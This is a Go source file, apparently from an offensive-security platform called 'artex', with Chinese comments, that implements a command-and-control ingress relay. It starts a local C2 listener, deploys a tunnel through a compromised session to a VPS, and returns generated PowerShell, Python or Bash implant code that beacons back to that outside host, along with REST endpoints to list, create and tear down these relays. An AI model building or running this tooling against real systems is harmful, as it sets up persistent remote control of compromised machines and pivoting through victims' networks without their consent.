package server

// C2 入站中继服务/API（P1）：工具与 Web 共用核心部署逻辑。

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/Autumn-27/artex/c2"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/tunnel"
)

type c2IngressRequest struct {
	SessionID          int64  `json:"session_id"`
	C2ListenerID       int64  `json:"c2_listener_id"`
	C2ListenerKind     string `json:"c2_listener_kind"`
	VPSHost            string `json:"vps_host"`
	VPSPort            int    `json:"vps_port"`
	PlatformHost       string `json:"platform_host"`
	PlatformChiselPort int    `json:"platform_chisel_port"`
	ImplantLang        string `json:"implant_lang"`
	NodeLabel          string `json:"node_label"`
	TaskID             int64  `json:"-"`
}

func (h *tunnelRuntime) deployC2Ingress(ctx context.Context, req c2IngressRequest) (map[string]any, error) {
	if h == nil || h.mgr == nil || h.srv == nil {
		return nil, fmt.Errorf("隧道运行时不可用")
	}
	rt := h.srv.c2rt()
	if rt == nil || !rt.enabled() {
		return nil, fmt.Errorf("C2 未启用（先 POST /api/c2/enable）")
	}
	if req.SessionID <= 0 || strings.TrimSpace(req.VPSHost) == "" || req.VPSPort <= 0 {
		return nil, fmt.Errorf("session_id / vps_host / vps_port 为必填参数")
	}
	listenerID := req.C2ListenerID
	if listenerID <= 0 {
		kind := strings.ToLower(strings.TrimSpace(req.C2ListenerKind))
		if kind == "" {
			kind = db.C2ListenerKindHTTP
		}
		if kind != db.C2ListenerKindHTTP && kind != db.C2ListenerKindTCP {
			return nil, fmt.Errorf("c2_listener_kind 仅支持 http 或 tcp")
		}
		port, err := freeLoopbackPort()
		if err != nil {
			return nil, fmt.Errorf("分配 C2 listener 端口失败: %w", err)
		}
		tok, err := randomToken()
		if err != nil {
			return nil, fmt.Errorf("生成 C2 token 失败: %w", err)
		}
		id, err := rt.store.CreateListener(ctx, &db.C2Listener{
			Name: "ingress-" + strconv.FormatInt(req.SessionID, 10), Kind: kind,
			BindHost: "127.0.0.1", BindPort: port, Token: tok,
		})
		if err != nil {
			return nil, fmt.Errorf("创建 C2 listener 失败: %w", err)
		}
		listenerID = id
	}
	l, err := rt.store.GetListener(ctx, listenerID)
	if err != nil || l == nil {
		return nil, fmt.Errorf("C2 listener 不存在")
	}
	if !isLoopbackHost(l.BindHost) {
		return nil, fmt.Errorf("C2 ingress 要求 listener bind 127.0.0.1，当前为 %s", l.BindHost)
	}
	if l.Status != db.C2ListenerRunning {
		if err := rt.startOne(ctx, listenerID); err != nil {
			return nil, fmt.Errorf("启动 C2 listener 失败: %w", err)
		}
	}
	platformHost := strings.TrimSpace(req.PlatformHost)
	if platformHost == "" {
		platformHost = strings.TrimSpace(h.callbackHost())
	}
	if platformHost == "" {
		platformHost = strings.TrimSpace(os.Getenv("ARTEX_TUNNEL_PLATFORM_HOST"))
	}
	if platformHost == "" {
		return nil, fmt.Errorf("platform_host 缺失：设 ARTEX_CALLBACK_ADDR 或传 platform_host")
	}
	platformPort := req.PlatformChiselPort
	if platformPort <= 0 {
		platformPort = resolvePlatformChiselPort()
	}
	if platformPort <= 0 {
		return nil, fmt.Errorf("platform_chisel_port 缺失：传参或设 ARTEX_TUNNEL_PLATFORM_PORT")
	}
	plan, err := tunnel.PlanIngress(&tunnel.PlanOpts{
		TaskID: req.TaskID, ViaSessionID: req.SessionID,
		ListenHost: "0.0.0.0", ListenPort: req.VPSPort,
		CallbackHost: platformHost, PlatformChiselPort: platformPort,
		C2CallbackHost: strings.TrimSpace(req.VPSHost), C2ListenerID: listenerID,
		TargetHost: "127.0.0.1", TargetPort: l.BindPort,
		DataDir: h.mgr.PlanDataDir(), NodeLabel: strings.TrimSpace(req.NodeLabel),
	})
	if err != nil {
		return nil, fmt.Errorf("ingress 计划生成失败: %w", err)
	}
	rec, err := h.mgr.Deploy(ctx, plan)
	if err != nil {
		return nil, fmt.Errorf("C2 ingress 部署失败: %w", err)
	}
	callback := net.JoinHostPort(strings.TrimSpace(req.VPSHost), strconv.Itoa(req.VPSPort))
	out := map[string]any{
		"tunnel_id": rec.ID, "state": rec.State, "listener_id": listenerID,
		"listener_kind": l.Kind, "callback_addr": callback,
		"platform_chisel_port": platformPort,
		"node_label":           strings.TrimSpace(req.NodeLabel),
	}
	lang := strings.ToLower(strings.TrimSpace(req.ImplantLang))
	if l.Kind == db.C2ListenerKindHTTP {
		baseURL := "http://" + callback
		out["base_url"] = baseURL
		if lang == "" {
			lang = "powershell"
		}
		switch lang {
		case "powershell":
			out["implant"] = c2.HTTPImplantPowerShell(baseURL, l.Token)
		case "python":
			out["implant"] = c2.HTTPImplantPython(baseURL, l.Token)
		case "bash":
			out["implant"] = c2.HTTPImplantBash(baseURL, l.Token)
		default:
			return nil, fmt.Errorf("HTTP implant_lang 仅支持 powershell/python/bash")
		}
		out["implant_lang"] = lang
	} else {
		key := make([]byte, 32)
		if _, err := rand.Read(key); err != nil {
			return nil, fmt.Errorf("生成 C2 信封密钥失败")
		}
		id := "ingress-" + strconv.FormatInt(rec.ID, 10)
		out["implant"] = c2.PythonImplant(callback, rt.mgr.Token(), base64.StdEncoding.EncodeToString(key), id)
		out["implant_lang"] = "python"
	}
	return out, nil
}

func (h *tunnelRuntime) teardownC2Ingress(ctx context.Context, tunnelID int64) (int64, error) {
	if h == nil || h.mgr == nil || h.srv == nil || tunnelID <= 0 {
		return 0, fmt.Errorf("tunnel_id 为必填参数")
	}
	rec, err := h.store.Get(ctx, tunnelID)
	if err != nil || rec == nil {
		return 0, fmt.Errorf("隧道 %d 不存在", tunnelID)
	}
	var plan tunnel.Plan
	_ = json.Unmarshal(rec.DeployParams, &plan)
	if err := h.mgr.Teardown(ctx, tunnelID); err != nil {
		return plan.C2ListenerID, fmt.Errorf("停止隧道失败: %w", err)
	}
	if plan.C2ListenerID > 0 {
		if rt := h.srv.c2rt(); rt != nil {
			_ = rt.stopOne(ctx, plan.C2ListenerID)
		}
	}
	return plan.C2ListenerID, nil
}

// ---- REST ----

func (s *Server) c2IngressList(w http.ResponseWriter, r *http.Request) {
	rt := s.c2rt()
	h := s.tunnels()
	if rt == nil || h == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]any{"error": "C2/隧道运行时不可用"})
		return
	}
	recs, err := h.store.ListIngress(r.Context())
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]any{"error": err.Error()})
		return
	}
	items := make([]map[string]any, 0, len(recs))
	for _, rec := range recs {
		var plan tunnel.Plan
		_ = json.Unmarshal(rec.DeployParams, &plan)
		listenerStatus := ""
		listenerKind := ""
		if plan.C2ListenerID > 0 {
			if l, _ := rt.store.GetListener(r.Context(), plan.C2ListenerID); l != nil {
				listenerStatus = l.Status
				listenerKind = l.Kind
			}
		}
		items = append(items, map[string]any{
			"tunnel_id":       rec.ID,
			"listener_id":     plan.C2ListenerID,
			"node_label":      plan.NodeLabel,
			"callback_addr":   net.JoinHostPort(plan.C2CallbackHost, strconv.Itoa(plan.ListenPort)),
			"vps_host":        plan.C2CallbackHost,
			"vps_port":        plan.ListenPort,
			"listener_kind":   listenerKind,
			"listener_status": listenerStatus,
			"state":           rec.State,
			"healthy":         rec.State == db.TunnelAlive && listenerStatus == db.C2ListenerRunning,
			"last_check":      rec.LastCheck,
			"error":           rec.Error,
			"created_at":      rec.CreatedAt,
		})
	}
	writeJSON(w, http.StatusOK, map[string]any{"ingress": items})
}

func (s *Server) c2IngressCreate(w http.ResponseWriter, r *http.Request) {
	h := s.tunnels()
	if h == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]any{"error": "隧道运行时不可用"})
		return
	}
	var req c2IngressRequest
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 64<<10)).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "请求体解析失败"})
		return
	}
	out, err := h.deployC2Ingress(r.Context(), req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, out)
}

func (s *Server) c2IngressTeardown(w http.ResponseWriter, r *http.Request) {
	h := s.tunnels()
	if h == nil {
		writeJSON(w, http.StatusServiceUnavailable, map[string]any{"error": "隧道运行时不可用"})
		return
	}
	id, _ := strconv.ParseInt(strings.TrimSpace(r.PathValue("id")), 10, 64)
	listenerID, err := h.teardownC2Ingress(r.Context(), id)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "tunnel_id": id, "listener_id": listenerID})
}
